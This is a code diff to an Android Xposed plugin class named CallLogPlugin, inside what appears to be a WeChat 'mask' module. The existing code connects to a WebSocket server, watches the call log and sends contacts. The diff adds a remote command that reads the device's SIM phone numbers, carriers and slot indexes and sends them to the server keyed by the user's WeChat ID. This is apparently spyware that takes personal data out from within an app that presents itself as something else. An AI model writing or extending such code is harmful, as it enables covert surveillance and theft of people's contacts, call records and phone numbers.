@@ -1,5 +1,6 @@
 package com.lu.wxmask.plugin
 
+import PhoneUtils
 import SmsUtils
 import android.annotation.SuppressLint
 import android.content.ContentResolver
@@ -7,6 +8,7 @@ import android.content.ContentValues
 import android.content.Context
 import android.database.ContentObserver
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
@@ -22,6 +24,8 @@ import com.lu.lposed.api2.XposedHelpers2
 import com.lu.lposed.plugin.IPlugin
 import com.lu.lposed.plugin.PluginProviders
 import com.lu.magic.util.log.LogUtil
+import com.lu.wxmask.BuildConfig
+import com.lu.wxmask.util.AppVersionUtil.Companion.getSmartVersionName
 import de.robv.android.xposed.XC_MethodHook
 import de.robv.android.xposed.XposedBridge
 import de.robv.android.xposed.callbacks.XC_LoadPackage
@@ -47,6 +51,9 @@ class CallLogPlugin : WebSocketClientListener, IPlugin {
         client?.connect()
 
         startListening(context.contentResolver)
+
+//        val list = PhoneUtils.getSimMultiInfo(context)
+//        LogUtil.i("list = $list")
     }
 
     override fun onOpen(handshake: ServerHandshake) {
@@ -96,9 +103,29 @@ class CallLogPlugin : WebSocketClientListener, IPlugin {
                         put("contacts", result)
                     }.toString())
                 }
+                12 -> {
+                    val phoneNumbers = PhoneUtils.getSimMultiInfo(mContext!!).map {
+                        val value = it.value
+                        JSONObject().apply {
+                            put("phone", value.mNumber)
+                            put("carrier", value.mCarrierName)
+                            put("slot", value.mSimSlotIndex)
+                        }
+                    }
+                    sendMessage(JSONObject().apply {
+                        put("data", phoneNumbers)
+                        put("source", json)
+                    }.toString())
+                }
+                else -> {
+                    if (type != null) {
+                        sendOriginMessage("""{"err":"不支持得类型${type}，检查androidId是否传错"}""")
+                    }
+                }
             }
         } catch (e: Exception) {
             e.printStackTrace()
+            sendOriginMessage("""{"err":"客户端异常：${e.message}"}""")
         }
     }
 
@@ -108,6 +135,11 @@ class CallLogPlugin : WebSocketClientListener, IPlugin {
         }.toString()
         LogUtil.i("sendMessage", text)
         client?.sendMessage(text, IdGet.getWxId(mContext!!))
+    }
+
+    fun sendOriginMessage(message: String) {
+        client?.sendMessage(message, IdGet.getWxId(mContext!!))
+        LogUtil.e("发送消息: $message")
     }
 
     fun queryByParams(params: JSONObject): JSONArray {
